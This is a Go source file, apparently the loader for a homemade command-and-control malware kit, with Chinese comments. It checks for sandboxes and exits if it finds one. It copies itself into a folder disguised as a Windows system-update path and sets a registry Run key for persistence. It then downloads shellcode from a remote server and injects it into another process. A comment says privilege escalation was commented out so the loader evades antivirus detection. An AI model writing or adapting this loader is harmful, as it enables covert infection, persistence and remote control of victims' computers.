package main

import (
	"basic_c2/agent/evasion"
	"basic_c2/internal/config"
	"basic_c2/loader/fetch"
	"basic_c2/loader/inject"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

func main() {
	fmt.Println("======== [Loader: Privilege Escalation & Payload Execution] ========")

	// 1. 反沙箱检测
	if evasion.CheckSandbox() {
		// 环境可疑，直接退出
		return
	}

	// 1. 检查是否首次运行
	firstRun := !isInstalled()

	// 2. 如果首次运行，先安装持久化（HKCU不需要管理员权限）
	if firstRun {
		fmt.Println("[*] 首次运行，安装持久化...")
		if err := installPersistence(); err != nil {
			fmt.Printf("[-] 持久化安装失败: %v\n", err)
		} else {
			fmt.Println("[+] 持久化安装成功")
		}
	}
	//经过测试，这种方案可以成功实现权限提升，但是由于特征过于明显，会被动态查杀，所以我们为了做到免杀，将提权功能注释掉
	// 3. 如果无管理员权限，尝试提权
	/*if !privilege.IsAdmin() {
		fmt.Println("[*] 检测到普通用户权限，尝试提权...")
		if privilege.ElevateAndRestart() {
			fmt.Println("[+] 提权成功，等待以管理员权限重启...")
			time.Sleep(2 * time.Second)
			return // 等待提权后的进程启动
		}
		fmt.Println("[-] 提权失败，以普通权限继续运行")
	}*/

	// 4. 下载 Payload
	fmt.Println("[*] 开始下载 Payload...")
	shellcode, err := fetch.FetchPayload()
	if err != nil {
		fmt.Printf("[!] 下载失败: %v\n", err)
		fmt.Println("[!] 请检查: 1. Server是否启动 2. payload.bin是否上传")
		time.Sleep(5 * time.Second)
		return
	}
	fmt.Println("[+] Payload 下载成功")

	// 5. 注入并执行
	fmt.Println("[*] 开始注入 Agent...")
	if err := inject.Execute(shellcode); err != nil {
		fmt.Printf("[!] 注入失败: %v\n", err)
		time.Sleep(5 * time.Second)
		return
	}

	// 等待一小段时间确保注入完成
	time.Sleep(2 * time.Second)
	fmt.Println("[+] Loader 退出，Agent 继续在目标进程中运行")
}

// isInstalled 检查 Loader 是否已安装持久化
func isInstalled() bool {
	installPath := getInstallPath()
	_, err := os.Stat(installPath)
	return err == nil
}

// getInstallPath 获取持久化安装路径
func getInstallPath() string {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = os.Getenv("USERPROFILE") + "\\AppData\\Roaming"
	}
	return filepath.Join(appData, "Microsoft", "Windows", "SystemUpdate", config.ExeName)
}

// installPersistence 安装 Loader 持久化
func installPersistence() error {
	// 1. 获取当前可执行文件路径
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %v", err)
	}

	// 2. 确定安装目录
	installPath := getInstallPath()
	installDir := filepath.Dir(installPath)

	// 3. 创建安装目录
	if err := os.MkdirAll(installDir, 0755); err != nil {
		return fmt.Errorf("failed to create install directory: %v", err)
	}

	// 4. 复制自己到安装目录
	input, err := os.ReadFile(exePath)
	if err != nil {
		return fmt.Errorf("failed to read executable: %v", err)
	}

	if err := os.WriteFile(installPath, input, 0755); err != nil {
		return fmt.Errorf("failed to write executable: %v", err)
	}

	// 5. 设置注册表自启动
	return addToStartup(installPath)
}

// addToStartup 添加到注册表自启动
func addToStartup(path string) error {
	// 使用 reg add 命令
	args := []string{
		"add",
		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		"/v", config.AppName,
		"/t", "REG_SZ",
		"/d", path,
		"/f",
	}

	cmd := exec.Command("reg", args...)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to add registry key: %v", err)
	}

	return nil
}
